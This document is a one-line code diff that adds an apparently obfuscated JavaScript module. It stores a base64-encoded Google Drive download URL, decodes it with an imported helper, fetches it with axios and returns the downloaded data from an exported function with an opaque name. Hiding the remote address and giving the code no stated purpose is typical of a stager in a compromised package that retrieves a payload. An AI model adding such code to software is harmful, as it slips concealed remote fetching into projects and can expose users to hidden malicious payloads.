@@ -1,0 +1,1 @@
+import axios from 'axios'; import { d } from './a'; const x = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xbW54SUg5aXBLa1JMckhRUHV1WTlWd3FkYUpxcUdmcnk='; export const cs = async () => { const __ = await axios.get(d(x)); return __.data; };
